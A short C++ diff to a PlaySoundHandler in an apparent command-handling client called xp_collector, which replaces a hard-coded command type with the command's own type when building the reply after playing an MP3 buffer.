@@ -16,6 +16,6 @@ std::unique_ptr<xp_collector::IRequest> xp_collector::PlaySoundHandler::handle(s
 	windows::play_mp3_from_buffer(play_sound_command->get_sound_buffer());
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
-		std::make_unique<BasicProduct>(command->get_command_id(), CommandType::PlaySoundCommand)
+		std::make_unique<BasicProduct>(command->get_command_id(), command->get_command_type())
 	);
 }
